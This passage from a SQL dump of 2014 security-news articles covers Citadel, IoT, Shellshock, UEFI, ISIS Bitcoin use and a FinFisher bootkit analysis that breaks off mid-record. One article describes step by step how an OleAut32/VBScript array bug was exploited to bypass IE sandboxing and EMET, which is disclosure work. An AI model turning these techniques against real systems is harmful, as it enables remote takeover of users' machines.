IBM Trusteer Apex identified the infection and mitigated it, sending a sample to the research lab for further analysis. An analysis of the configuration file shows that the attackers were using a legitimate Web server as the C&C. However, by the time the IBM Trusteer research lab received the configuration file, the C&C files were already removed from the server, so researchers were not able to identify who is behind this configuration. Because the configuration file instructs the malware to capture keystrokes related to widely used password management and authentication solutions, we can’t know who, exactly, is the target of the attack. It might be an opportunistic attack, where the attackers are trying to see which type of information they can expose through this configuration, or a more targeted attack in which the attackers know that the target is using these specific solutions. Someday, we might be able to move away from passwords.   in 2011 that by 2016, we will not use passwords to access sensitive resources. Instead, our unique biological identity and biometric data such as facial definitions, iris scans, voice files and DNA could be a vital part of keeping personal information safe, replacing the current user ID and password system. However, until then, we must secure our passwords and prevent fraud and exposure from adversaries and cybercriminals. Password management and   programs are important solutions that help secure access to applications and Web services. However, it is important to understand that these solutions can be compromised by malware. If an adversary is able to steal the master password and gain access to the user/password database of a password management solution or compromise an authentication technology, the attacker can gain unfettered access to sensitive systems and information. Therefore, it is important to ensure access to sensitive systems — whether corporate applications or online services for personal use — is done from malware-free machines. This requires   that is specifically designed to handle highly sophisticated and evasive malware such as Citadel and other massively distributed advanced persistent threat malwares.', '\'Advanced Malware\', \'Authentication\', \'Citadel Malware\', \'Command-and-Control (C&C)\', \'Malware\', \'Password\', \'Password Management\', \'Software-as-a-Service (Saas)\', \'Trojan\'', 'https://securityintelligence.com/cybercriminals-use-citadel-compromise-password-management-authentication-solutions/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (489, 'IoT: Will Ubiquitous Connectivity Mean Less Security?', 'Leslie Horacek', '2014-11-17', 'Today, IBM released the fourth edition of the  , which focuses on how the Internet continues to connect more people, places and things, resulting in a new range of security risks. In particular, it takes a closer look at new threats from the   and the sources of malware and botnet infections.\n By innovating how we connect, this technology is transforming how security threats are viewed in our lives and in business. Today, it may seem more like a curiosity than a valid business concern. Upon hearing the term “IoT,” many call to mind a circus of devices with esoteric functions, such as Google Glass and the new Apple Watch wearables, or perhaps home automation hardware such as thermostats that are aware of their owners’ presence or refrigerators that post to Facebook when you’re out of milk.\n However, in a  , analysts estimate that the IoT will represent 30 billion connecting “things” by 2020, growing from 9.9 billion in 2013. These connected “things” are largely driven by intelligent systems collecting and transmitting data. While we are still defining what the IoT is and how it will benefit individuals and enterprises, rest assured that it is a revolution and will take its place among existing emerging technologies such as the cloud, analytics, mobile and social. As with other broad categories of technology such as the cloud or mobile, the   can offer productivity and quality-of-life improvements, but it can also drag in its wake a host of unknown security threats. The devices that comprise the broad IoT perform different functions, expose wildly diverse threat surfaces and require   that are specific to each category of device. IBM X-Force has created a model of the IoT that is useful for understanding the security threats at various data flow and control transition points. \n \n In the past few years, the types of attacks that have been reported across the IoT have been varied, such as the exploitation of Web application vulnerabilities, man-in-the-middle attacks and password attacks. Another important area that is not explored in the report but is important to mention is employees working from home with cable/DSL modems and home routers. When a remote employee’s traffic enters back through the enterprise network, the types of attacks available should be a deep concern for security administrators. This topic was explored in greater depth earlier in the year in an   about remote workers and home security.\n IBM has cautioned in the past that designing security from the outset and exercising secure development practices is vital to creating secure products. As the “things” that comprise the   are developed by multiple manufacturers, this advice becomes more relevant because the consequences affect not just the integrity of data and privacy of the owners of that data, but also the safety of users. To help address the security challenges within the IoT, IBM X-Force recommends that manufacturers do the following:\n This latest report also looks at some findings gleaned from IBM X-Force’s IP Reputation database. IBM X-Force wanted to establish a baseline of the sources of massively distributed malware. It looked at the countries where malicious links are most often hosted and the geographic distribution of botnet command-and-control (C&C) servers.\n \n Typically, attackers use remote code execution to install malware, which may have any number of malicious actions, such as keylogging, screen-grabbing and remote access for the attackers. Those actions all result in stolen data, which the malware reports to its C&C servers. Although the United States hosts the largest number of contaminated IP addresses for both malware and botnet C&C servers, when normalized for addressable IP space, Eastern European countries show the highest infection rates.', '\'IBM\', \'Internet of Things (IoT)\', \'X-Force\'', 'https://securityintelligence.com/iot-will-ubiquitous-connectivity-mean-less-security/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (490, 'IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows', 'Robert Freeman', '2014-11-11', 'The IBM X-Force Research team has identified a significant data manipulation vulnerability ( ) with a CVSS score of 9.3 in every version of   from Windows 95 onward. We reported this issue with a working proof-of-concept exploit back in May 2014, and today, Microsoft is patching it. It can be exploited remotely since Microsoft Internet Explorer (IE) 3.0. This complex vulnerability is a rare, “unicorn-like” bug found in code that IE relies on but doesn’t necessarily belong to. The bug can be used by an attacker for drive-by attacks to reliably run code remotely and take over the user’s machine — even sidestepping the Enhanced Protected Mode (EPM) sandbox in IE 11 as well as the highly regarded Enhanced Mitigation Experience Toolkit (EMET) anti-exploitation tool Microsoft offers for free. First, this means that significant vulnerabilities can go undetected for some time. In this case, the buggy code is at least 19 years old and has been remotely exploitable for the past 18 years. Looking at the original release code of Windows 95, the problem is present. With the release of IE 3.0, remote exploitation became possible because it introduced Visual Basic Script (VBScript). Other applications over the years may have used the buggy code, though the inclusion of VBScript in IE 3.0 makes it the most likely candidate for an  . In some respects, this vulnerability has been sitting in plain sight for a long time despite many other bugs being discovered and patched in the same Windows library (OleAut32). Second, it indicates that there may be other bugs still to be discovered that relate more to arbitrary data manipulation than more conventional vulnerabilities such as buffer overflows and use-after-free issues. These data manipulation vulnerabilities could lead to substantial exploitation scenarios from the manipulation of data values to remote code execution. In fact, there may be multiple exploitation techniques that lead to possible remote code execution, as is the case with this particular bug. Typically, attackers use remote code execution to install malware, which may have any number of malicious actions, such as keylogging, screen-grabbing and remote access. IBM X-Force has had product coverage with its network intrusion prevention system (IPS) since reporting this vulnerability back in May 2014, though X-Force hasn’t found any evidence of exploitation of this particular bug in the wild. I have no doubt that it would have fetched six figures on the gray market. The proof of concept IBM X-Force built uses a technique that other people have discovered, too. In fact, it was presented at this year’s  . In VBScript, array elements are actually Component Object Model (COM)  . Each element is a fixed size of 16 bytes, with an initial WORD indicating the Variant type. Under normal circumstances, one will only have control of a maximum of 8 bytes of this data through either the Variant type for double values or for currency values. Array Elements: | Variant Type (WORD) | Padding (WORD) | Data High (DWORD) | Data Low (DWORD) |\n Cutting to the chase, VBScript permits in-place resizing of arrays through the command “redim preserve.” This is where the vulnerability is. redim preserve arrayname( newsizeinelements )\n VBScript.dll contains a runtime evaluation method, CScriptRuntime::Run(VAR *), which farms out the SafeArray redimension task to OleAut32.dll with the   function. Essentially, what happens is that fairly early on, SafeArrayRedim() will swap out the old array size (element count) with the resize request. However, there is a code path where, if an error occurs, the size is not reset before returning to the calling function, VBScript!CScriptRuntime::Run(). For VBScript, exploitation of this bug could have been avoided by invalidating the common “On Error Resume Next” VBScript code when the OleAut32 library returns with an error. Since it doesn’t, one can simply rely on this statement to regain script execution and continue to use “corrupted” objects. This VBScript code snippet is extremely common and its presence would not indicate that this vulnerability has been exploited. This is the fun part. Although the bug originates in some very old code within the OleAut32 library, I’m approaching exploitation from the perspective of VBScript within Internet Explorer because all versions since 3.0 are vulnerable through this vector. Exploitation is tricky, partially because array elements are a fixed size. Yet there are two additional issues that complicate exploitation. The first is that there is little opportunity to place arbitrary data where VBScript arrays are stored on the IE heap. The second issue is that, assuming you are now addressing outside the bounds of your VBScript array (Safe Array), you will find the unpleasant enforcement of Variant type compatibility matching. In the end, the key to exploitation toward reliable code execution was to take advantage of the difference in the element alignment of the arrays (16 bytes) and the alignment of the Windows heap (8 bytes). This provides opportunities to change the Variant type in an element of an adjacent array and to read that content back through the original array reference. In short, with this kind of memory manipulation available, an attacker can do a number of things. One possibility is to create arbitrary dispatch pointers for VT_DISPATCH or VT_UKNOWN types. This can lead to Data Execution Prevention (DEP) firing if the specified pointer does not correspond to a memory address with execution enabled. There are ways around that, too, but I’ll return to that later. Another possibility would be to use this attack to grab some heap data, but that is a little inconvenient because, again, you run into Variant type compatibility matching. If the location outside of the array boundary that would hold the Variant type is not a known Variant ID or combination on a read operation, or if it is not directly compatible on a write operation, nothing further will happen. However, again, one can abuse the Variant type of objects in the array. So if attackers start with a BSTR and create a Unicode representation of the data they want another type to point to, it can be used to create objects that can lead to more elaborate exploits. At the time I made the vulnerability discovery, I also happened to run across a blog post hinting that a combination of VT_ARRAY and VT_VARIANT could be useful in this respect. Massaging the data for the VT_VARIANT|VT_ARRAY object permits the use of any virtual address instead of being stuck with the relative addresses of the array boundaries we resized. Furthermore, as we are now dealing with an array of variants, we can use the vartype() command to obtain 16 bits of information from any address we specify. The reason for the 16 bits is just that COM variants max out at 16 bits of data. While we still have to deal with the variant compatibly enforcement, many exciting possibilities now exist. One of these possibilities permits a data-only attack. The next step for this possibility leverages a memory leak leading to the VBScript class object instance. Content can be left behind in the array data that was never intended to be read. By again changing the variant type of an object in the adjacent array, we can read information that ends up being the point to the VBScript class object. Coincidentally, multiple   may have noticed that both Jscript and VBScript from Microsoft have a check to see whether they are running in a safe mode such as at the command prompt. This check looks at a member of the VBScript (or Jscript) class object to see whether it is in this safe mode. Another great coincidence is that not only can we reliably get to this location in memory using the address leak just discussed, but the nearby data in memory should always pass the variant type compatibility test and permit us to change the value and get code execution indirectly through running unsafe COM objects (think ActiveX) with arbitrary parameters. This is the same attack technique that   presented at the Black Hat USA conference this year called the “Vital Point Strike.” Using this approach, which does not use shellcode or more exotic means such as return-oriented programming gadgets, both the EPM sandbox in IE as well as use of Microsoft’s EMET tool are bypassed. Let’s return to DEP for a moment. There are options here. For example, if there is any read+write+execute (+RWE) memory in a predictable location, we can manipulate objects to point to that memory. Similarly, we could create a large BSTR by pointing a BSTR to the +RWE memory and using the arbitrary write on top of null characters from the +RWE memory to set a large size. The hope is that we could do some in-place modifications with Unicode representations of shellcode. I haven’t tested this out, but it is an interesting idea. Subsequently, we could create arbitrary VT_DISPATCH or VT_UNKNOWN pointers that enable us to point back into the +RWE under our control. However, loading objects or plugins known to create +RWE by default is still a bit of a hassle. If we have the ability to read arbitrary memory and create arbitrary VT_DISPATCH and VT_UNKNOWN pointers, and we have some ability to control data in memory — either through ordinary heap data we can use with our VBScript and/or data we can touch and change (compatibility testing passes) — we should have no trouble creating Windows API calls. This happens to be another method Yang presented and called “Interdimensional Code Execution.” In fact, using it to disable DEP is possible but somewhat of a waste of an elegant approach for a sledgehammer result. Hopefully, if you’ve made it this far, you have a pretty good idea how powerful the data attacks facilitated by this bug can be. Again, our disclosure was originally submitted a number of months ago, and while we are not exclusive with the exploitation techniques described, it contributes well toward our goal of describing a significant   and how it was turned into a viable proof-of-concept attack toward disclosure. We incorporated product coverage for the OLE vulnerability with our network IPS, and so far, the signature we developed has not fired. However, for the attack techniques discussed, I think it is a only matter of time before we see them in the wild.', '\'Microsoft\', \'Vulnerability\', \'Windows\', \'X-Force\'', 'https://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (491, 'Uncloaking the Dark Arts of Evasive Malware', 'Engin Kirda', '2014-11-3', 'With so many security breaches in the headlines ­­from   to   to  , ­­it would appear that cyber­criminals are winning the arms race against security professionals. Multinational retailers and banks are generally on the cutting edge of security technology adoption in the private sector, deploying a wide range of the latest network, application, physical and policy­based security defenses across their organizations. But with so many layers of defense in place against these attackers, how do they keep getting through? And with so many breaches made possible by malware being publicly disclosed, why are they still happening?\n One of several answers is that malware is evolving and adapting to evade detection by traditional defenses. Signature-­based antivirus (AV) and web gateway technologies can’t keep up with the rapid evolution of evasive malware. As my Lastline Labs colleague and fellow Lastline co­founder and UCSB Professor, Dr. Giovanni Vigna, wrote about in May,   gets past signature­-based AV technologies on Day 0, and some malware gets past some AV scanners for a full year. Because attackers can use simple techniques like obfuscation to bypass AV detection, it is not effective in detecting advanced malware.\n Producers of malware have also come up with ways to fingerprint the security systems designed to fingerprint them. And newer, behavior ­based anti­malware sandboxes, which rely on virtualized operating systems to test unknown binaries before allowing them onto the network, are both visible to evasive malware and lack full visibility into how malware would behave in a “real” environment.\n If you look at the evolution of security defenses from AV protection to virtualized sandboxing, they map to the evolution of malware from simple viruses to polymorphism to packing to APTs. But there is currently a security gap in security solutions that aren’t evasion ­resistant.\n Thus, it becomes very important to better understand evasive malware. What is evasion?\n Evasion is code that changes the behavior of the malware if it detects that it is running in a traditional sandbox, or it has not reached the intended target, or that some sort of detection technology is running in the background. Malware authors know that sandboxing (or “dynamic analysis”) is popular and widely used, and because code is being executed, malware authors have options to detect analysis.\n Evasive malware isn’t entirely undetectable though. The more we see it the more we can learn from it ­­and the faster we can stop it. There are key behaviors of evasive malware we can watch for and retool security systems to detect.\n First, evasive behaviors often vary across static and dynamic analysis environments. Static analysis techniques can be evaded by packing, encrypting or delaying the inclusion of incriminating code. Static analysis can also be eluded through exploitation of differences between the target system (say a Windows laptop) and the analysis system (say a gateway appliance). In this example, if the target is the Windows OS, the malware producer can either parse an executable to exploit Windows or a document to exploit Office. Static analysis techniques can be rendered useless by making particular malware operations dependant on data known only at run­time, such as table lookups based on user input.\n To bypass dynamic analysis, evasive malware will fingerprint security systems and then fail to execute, stall or loop until analysis is complete (and rendered ineffective). By detecting the modified environment of dynamic analysis, evasive malware “senses” it is under scrutiny and behaves as if it is benign. Evasive malware can detect instrumented libs as well as auxiliary processes and services not present in a typical target machine or OS. It can also detect specific hardware and software configurations, determining which devices, users and file names exist. These will often be very different in a dynamic analysis environment than in a “real” environment.\n As with static analysis, dynamic analysis can be evaded by taking advantage of differences in the execution capabilities of the analysis vs. the target system, such as semantics, speed and available resources. For example, evasive malware can determine if a human is using the host machine by checking whether a keyboard or mouse is attached, and whether that mouse moves. Evasive malware producers must take care to insure that environmental fingerprinting activities are subtle so as not to raise user suspicion.\n  family, which has been repeatedly plaguing point­-of-­sale machines at retailers, displays several of these evasive characteristics. The U.S. Secret Service estimates more than 1,000 businesses have been affected. If you take a Backoff sample and analyze it in Lastline’s high resolution malware analysis environment, you will see that it uses:\n While fingerprinting analysis systems has gotten evasive malware producers ahead in the cyber­security arms race, it can be used against them. Evasive behaviors can now be used as signals for detection, and dynamic analysis environments can be designed to be both resistant to fingerprinting and have greater visibility into evasion techniques.\n Second, it’s also important to note that while the malware being used may be evasive, the attack techniques to deploy malware are not always as sophisticated. Attackers often scan the Internet for remote desktop applications and brute force admin login credentials. In the case of Backoff, they use these admin credentials to deploy Backoff to remote PoS systems. In other cases, social engineering or insiders are used to gain access to systems that appears legitimate. So security policies and education must be designed to prevent employees from, intentionally or inadvertently, becoming a weak link and exposing their organizations to compromise.\n However, in most advanced targeted attacks, malware plays a central role. And increasingly, that malware makes use of evasion techniques to get past both static and dynamic analysis. So by implementing an analysis environment that prevents its own fingerprinting while detecting and defeating evasion techniques, organizations can better defend their systems, employees, partners and customers from security breaches. In this way, the dark arts of evasion can be used to shed light on malware that would otherwise go undetected.', '\'Advanced Persistent Threat (APT)\', \'Antivirus\', \'Backoff Malware\', \'Command-and-Control (C&C)\', \'Cybercriminals\', \'Cybersecurity\', \'Data Breach\', \'Malware\', \'Sandboxing\', \'Security Breach\', \'Targeted Attacks\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/uncloaking-the-dark-arts-of-evasive-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (492, 'IBM X-Force Perspective on the Aftermath of Heartbleed and Shellshock', 'Chris Poulin', '2014-10-29', 'With the fog of the   still clouding our eyeglasses, it is easy to lose sight of the  , which isn’t that long past and not entirely behind us. At IBM’s Insight conference in Las Vegas, I will be diving into the latest  , in which we analyzed Heartbleed and tracked exploitations by cybercriminals. The following are some of the striking similarities between Shellshock and Heartbleed: IBM’s X-Force is seeing continued activity trying to exploit both vulnerabilities. Even months after the disclosure of Heartbleed, and after the initial exploitation frenzy, we still see a continued campaign against vulnerable systems. There is always a long tail after a vulnerability is disclosed, and organizations with more mature patching programs identify vulnerable systems and take remedial action, but there are always stragglers who are either slow to patch or don’t have an accurate asset inventory to identify systems that may be vulnerable. We expect to see the same long tail with Shellshock. However, what keeps me up at night is the distraction of headline-grabbing vulnerabilities such as Heartbleed and Shellshock. They distract from fixing the easy vulnerabilities that have been around for years. I’m talking about SQL injection, cross-site scripting (XSS) and cross-site request forgery (XSRF). To avoid SQL injection, just use parameterized database queries such as stored procedures; XSS/XSRF is a matter of input sanitization. We also continue to fall victim to vulnerabilities in content management systems, especially their third-party plug-ins. We’ve known about SQL infections and their solution for well over a decade. That’s a really long tail, and yet it is still in the  . Given that we can’t seem to eradicate simple vulnerabilities like SQL infections, how long will it take before we can close the case file on Heartbleed and Shellshock?', '\'Bash Bug\', \'Cross-Site Scripting (XSS)\', \'Heartbleed\', \'Heartbleed OpenSSL Vulnerability\', \'Shellshock\'', 'https://securityintelligence.com/ibm-x-force-perspective-on-the-aftermath-of-heartbleed-and-shellshock/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (493, 'Lessons Learned for Incident Response From the Ebola Outbreak', 'Brian Honan', '2014-10-29', 'Over the past number of months we have witnessed the Ebola crisis grow from being a localized problem with little impact on a global scale to a major global concern with the World Health organization (WHO) warning that the disease could infect up to 10,000 people per week if it is not dealt with. While this is a major health crisis, I could not help draw parallels on how this crisis has developed and been handled to how many organizations deal with their incident response for computer security incidents. This   on why Ebola won’t gain a foothold in Western countries examines how the disease has managed to spread to date. Some of the key points from the article are; Having worked on various security breaches for clients, and reviewing details of security breaches such as Target, there are many lessons we can learn from the Ebola crisis to ensure that we can improve our own cyber security incident response. When looking at our own environments we need to ask ourselves; While hopefully we may never have to deal with the cyber equivalent of Ebola in the cyber realm, it is worth taking time to analyze how major crisis in the real world are handled and how to apply lessons learnt from them to the digital realm.', '\'Cybersecurity\', \'Incident Response (IR)\'', 'https://securityintelligence.com/lessons-learnt-for-incident-response-from-the-ebola-virus-outbreak/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (494, 'ISIS. Are they Using Bitcoins to Fund Criminal Activities?', 'Brooke Satti Charles', '2014-10-29', 'The Islamic State of Iraq and Syria (ISIS) has been called the world’s richest terror group. While the group generates the majority of its funds through oil fields seized in northern Iraq and Syria, it still relies on a number of other ways to secure financing. Donations from wealthy sympathizers greatly helped ISIS when it was first established. However, now that global governments are aware of   and actively look to track and block all funding efforts through banking channels, donations have become harder to receive. These difficulties have not stopped ISIS from seeking ways to bypass sanctions and money-laundering filters, however. The group has begun to use cryptocurrencies such as Bitcoins as it looks for anonymous and untraceable ways to transfer money. Virtual currency is an electronic cryptocurrency used to purchase both virtual and actual goods and services. It is not contractually backed by assets or legal currency laws, it is not controlled by a central authority and it is not a tangible good. Bitcoins can be sent to anyone who has an Internet connection. The first step in dealing in this type of currency is to set up a virtual wallet where Bitcoins and their transaction history are stored. According to  , the wallet houses a file of secure digital keys used to access your public Bitcoin address and sign transactions. They are traded by sharing a wallet’s anonymous private identification number with the merchant or peer. Wallets are a way to store the digital documentation of the   value and grant access to users to spend them. There are many kinds of virtual wallets, with the most popular forms being desktop wallets, Web-based wallets and mobile wallets. Like most forms of technology, fraudsters, criminals and   will find ways to exploit them for nefarious uses — Bitcoin is no different. Due to its anonymity and untraceabilitiy, it is used for criminal activities such as laundering money, buying and selling illegal goods and services and transferring money to support criminal or terror activities.  , a pro-ISIS blog, discusses how Bitcoins can be used to fund the caliphate. The post states that they are untraceable by Western governments and, therefore, they will not be stopped by regulatory screening processes. The blog then discusses the decentralized nature of virtual currencies, specifically stating that they are able to access markets that cross all borders and nation-state regulations to send money instantly and in a way that is untraceable by “Kafir” governments. In an additional step to keep the senders’ and receivers’ identities secret, the blog post discusses the use of dark wallets. Dark wallets offer Bitcoin users more protection in relation to privacy and identity. It is also widely known that dark wallets may enable serious crimes such as murder, child pornography, drug and weapon sales and terror group financing. According to the blog, Bitcoins are an entirely anonymous donation system that could send millions of dollars instantly from the United States, United Kingdom, South Africa, Ghana, Malaysia and Sri Lanka. On Oct. 13, Reddit’s Bitcoin forum discussed how the ISIS blog site was accepting Bitcoin as a form of payment on the Swedish/Latvian conversion site  . The blog claims the payments are strictly for maintenance and hosting the website. Reports indicate that Yourserver.se closed the account, claiming it has a strict terms and conditions policy that prohibits using its service for illegal activities. Yourserver.se lists its terms of service on its site and bans the following: It is not surprising that ISIS would begin to adapt to using cryptocurrencies as a way to receive funds; the group has proven to be quite skillful with technology and social media. ISIS has been known to spread propaganda, recruit individuals and seek funds through tools such as Twitter, Facebook, YouTube and Ask.fm. There are some challenges with how ISIS would turn Bitcoins into physical currency in the states in which it operates. Many ISIS-controlled territories do not have the technology to extract high amounts of Bitcoins for cash. However, nearby Turkey, Israel and Dubai all have a small but flourishing Bitcoin community, with a few Bitcoin ATMs available. Bitcoin ATMs work just like bank ATMS and are electric communication devices that allow Bitcoins to be exchanged for cash without the need for a cashier. It is important to note that some models only allow for the purchasing of Bitcoins. When a Bitcoin ATM is not available, users can sell them online; however, this type of sale often requires users to verify their identity.', '\'Bitcoin\', \'Cryptocurrency\', \'ISIS\', \'Red Cell\', \'Virtual Currency\'', 'https://securityintelligence.com/isis-are-they-using-bitcoins-to-fund-criminal-activities/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (495, 'Revelations in Data Protection in the Aftermath of Shellshock', 'Michelle Alvarez', '2014-10-28', 'Who came up with the notion that less is more? In terms of data protection, I’m pretty sure that more is more. Sometimes, having more results in a positive outcome (such as more canned foods during a food drive) and sometimes, having more results in a negative outcome (such as more rain in a flood zone). When it comes to data, more is a good thing, and analysts such as myself become giddier when there are massive amounts of data to play with. With all this data to analyze, my colleagues and I shared some of our thoughts in a research and intelligence paper titled “ .” The majority of the attacks source from the well-known search engine   probing and cataloging vulnerable systems. This data is often used by attackers to identify vulnerable systems. Who can blame them for wanting to narrow their attack surface? Outside of this activity, we investigated several interesting vectors used to target this vulnerability, including email reconnaissance, perlbot password-grab attempt, perl reverse shell and mayhem malware installer. During the beginning stages of an incident,   spend most of their energy putting out fires and working quickly to research, respond and mitigate the threat. There is no time for us to “ooh” and “aah” at wondrous charts or bask in the beauty of a glorious trend line. When all is said and done (well, sort of — the threat never really goes away), we take a deeper look at the data. In looking at  , we now expect high-profile threats to be exploited almost immediately after the public release of an exploit; Shellshock was no exception. Still, I reserve the right to be surprised by the speed at which attackers jumped all over the   in GNU Bash. Within one hour of the public release of an exploit targeting this issue, we observed a significant uptick in activity associated with this threat. This initial spike on Sept. 25 was caused by over 800 events. A much larger spike in activity was witnessed on Sept. 27, with more than 1,200 events reported. Attacks came in waves from different source IPs and originating countries. Almost as soon as one attack was mitigated by the Internet service provider, another one quickly took its place. Many of the attacks originated from a single Autonomous Systems Number or even a single IP, which is not uncommon in widespread attacks such as this. The clear leader in attacks is the United States, with more than 15,000 recorded attacks (ooh, ahh). You’ll have to view the paper to “ooh” and “ahh” at the other graphs, but I would like to point out that other notable discoveries include Iceland making our top 10 attacking countries list for the first time. Additionally, while Japan ranked low in the list of attacking countries, it sustained the highest number of attacks from the most countries. The finance and information technology industries experienced spikes in activity throughout the time period analyzed, whereas the targeted activity against the other top industries remained relatively flat.\n The   is a good example of a growing trend we’re observing on the attacker front called “attacks that snub malware,” which is often referred to in the industry as “malware-less” attacks. This simply means attackers don’t want to risk malware detection, so they instead exploit existing application functionalities.\n \n This is why it is important for organizations to take a holistic approach to securing their networks. Make sure to monitor your distribution sites and apply updates as they become available for this vulnerability. Many vendors that offer intrusion prevention or intrusion detection systems also now have specific coverage to address this threat and provide assistance with an organization’s data-protection efforts.', '\'Data Protection\', \'Exploit\', \'Shellshock\', \'Vulnerability\'', 'https://securityintelligence.com/revelations-in-data-protection-in-the-aftermath-of-shellshock/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (496, 'Endpoint Security: Is It Time to Bid Farewell to BIOS and Embrace UEFI?', 'Souvik Khamaru', '2014-10-22', 'In 1981, the concept of the Basic Input/Output System (BIOS) and the concept of the   were introduced. These concepts were farfetched then because at the time very few people perceived any security threats that could have infected BIOS. Three decades later, security researchers have identified vulnerabilities to servers and endpoints posed by BIOS.  is aimed at the unauthorized modification of BIOS firmware through malware. Such guidance can help improve security and mitigate remote attacks, but it will not stop a dedicated attacker who may try to tamper with BIOS using unshackled physical access to respective servers. BIOS is a de facto standard-defining firmware interface built into IBM-compatible PCs and servers. BIOS is the first software run when the system is turned on. Although BIOS has not been a primary target of attackers, recent low-level attacks on endpoint systems have created the perception that attackers can gain entry into the systems by going lower or putting in more effort to reach bare metal. Getting any closer to bare metal is as good as reaching BIOS. In 1998, the Chernobyl, or Spacefiller, virus attempted to overwrite critical information and overwrite BIOS, such as NSA BIOS backdoor (DEITYBOUNCE) and the Mebromi rootkit. All of these attempted to reinsert   into the BIOS that would continue to reinfect the system. Infected BIOS is more than a problem; it is a persistent attack. Even if an antivirus program detects and cleans the master boot record infection, after every system reboot, the infected BIOS payload will repeatedly overwrite the master boot record code. Developing antivirus code for BIOS is a challenge since any error within the antivirus solution will render the system unbootable. A stronger, more secure BIOS is the foundation of computer and endpoint   — as well as greater trust within a computer system. Such protection can be found in UEFI.\n Some describe UEFI as the complete reimagining of the computer boot environment. As BIOS is a solid piece of firmware, UEFI is a programmable software interface that resides on computer hardware and firmware. UEFI resides on the /EFI/directory in nonvolatile memory as opposed to the entire boot code sitting on the motherboard’s BIOS. Once the computer boots into UEFI, a set of instructions is carried out for POST to load the operating system. In the process, the UEFI specification defines boot and runtime services, protocols for communication between device drivers, services and extensions. Further flexibility is offered as UEFI can be used by almost every combination of 32- and 64-bit Intel and AMD chips. Each case is a matter of compiling the boot code for the target platform. So what makes UEFI more secure than BIOS? Among other features, UEFI’s specifications add a protocol known as a secure boot. The beauty lies in how the secure boot prevents device drivers and operating system loaders unless they are not signed with an acceptable digital signature. When the secure boot is enabled, it allows a public key commonly known as a platform key to be written to the firmware. When the secure boot is in “user mode,” the driver and loaders that are signed with the platform key can be loaded and ready for operation. Critics describe secure boot as an attempt to remove a user’s ability to control the operating system of a computer. Distribution developers may not disclose the private key, making the boot loader a problem in secure boot. Amid some practical issues regarding key disclosure and key shipping, several Linux distributors have developed different implementations for secure boot. For example, shim is a pre-compiled, signed boot loader that allows users to individually trust keys provided by distributors. Essentially, we have witnessed the partial adoption of UEFI, such as functionality with certain customizations. This is all well and good, but is it entirely secure? At the recent Black Hat conference, a group of security researchers presented a series of exploits specifically implementing UEFI to compromise a secure boot. These exploits work because certain vendors do not protect the firmware at the required level, allowing attackers to modify the code responsible for invoking the secure boot. Once these exploits are targeted to modify the platform key, however, it needs to be executed in kernel mode, which limits the possibility of the attack to a certain extent. The problem grows exponentially when attackers are able to execute the exploit in secure boot’s user mode, gaining permission to execute code on the trusted system’s device drivers, operating system and regular applications, such as Java and Microsoft Office. Systems whose UEFI variable can be modified directly from the OS can be rendered unusable and easily exploited in cyberattacks where mass systems are impacted. UEFI security features are designed to prevent bootkits from being installed. These bootkits hide inside the system loader and start before the actual OS can run. It is possible to modify a setup variable in certain implementations of UEFI that can bypass the secure boot feature. The affected computer will fail to start again in case the unprotected setup variable is set to “zero.” This is called a “brick” system. Recovering from such an attack would be difficult and time-consuming because it involves reprogramming the BIOS chip, which requires manual intervention and specialized equipment. UEFI was originally designed to replace BIOS to standardize modern computer firmware through the usage of common framework and reference specifications to be used by original equipment manufacturers (OEMs) and BIOS vendors. However, practically, there can be significant differences in how UEFI is implemented across different computer manufacturers and may even vary across different products from the same vendor. Investigating BIOS security issues has been difficult in the past due to cost and a need for specialized skills. However, with the advent of UEFI, more researchers are looking into and investigating the problems. Hopefully, over the next few years, the most obvious vulnerabilities will be identified and fixed. I feel that despite these vendor implementation differences, secure boot is still a huge step forward and, in the future, its implementation should be tightly controlled with predetermined and monitored reference specifications governing OEMs’ system build process.', '\'Endpoint Security\', \'Unified Extensible Firmware Interface (UEFI)\'', 'https://securityintelligence.com/endpoint-security-is-it-time-to-bid-farewell-to-bios-and-embrace-uefi/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (497, 'Analysis of FinFisher Bootkit', 'Igor Aronov', '2014-10-20', 'We recently   the FinFisher bootkit malware published by  . Most components of the Windows version of FinFisher are basic, so let’s skip directly to the kernel mode driver and the Bootstrap code. The kernel mode driver directly reads and writes raw data from/onto a hard drive. The approximation of the technique used by the driver can be found in  . The malware makes a copy of the original master boot record (MBR) and stores it elsewhere on the hard drive. Additionally, the malware writes 0x2A00 bytes of data onto the infected hard drive. This data is later copied by the malicious Bootstrap code. The address of the first sector containing this data is hard-coded into the bootstrap code. The   uses Logical Block Addressing (LBA) to find a physical location of the malicious data on the hard drive. On the test machine, the MBR was overwritten with the following data: By quickly glancing over the data, we can make our first observation that the Bootstrap code is changed by the malware, but the partition table information is preserved. Let’s review in more detail the most interesting parts of the Bootstrap code. First, it performs an Extended Disk Drive (EDD) installation check: The malware sets a flag that indicates whether EDD is installed. This flag controls the method used by the malware to read data from a hard drive into the physical memory: Next, the malware gets drive parameters: At this moment, the malware has gathered enough information to copy the malicious blob of 0x2A00 bytes from a hard drive into the physical memory. The blob of data is copied one sector at a time. The code below is the loop that is used by the malware to copy the blob: Below is code for the function that is used to copy the data if EDD is installed: For this example, the arguments before the call to INT 13h to copy the first sector of malicious data into the physical memory on the test machine are the following: After the malware finishes copying the data, it jumps to the copied code and continues execution there: The code at 0x1000 is the most interesting part of the malware. But before we continue the analysis, it might be a helpful reminder that the FinFisher bootkit runs in real 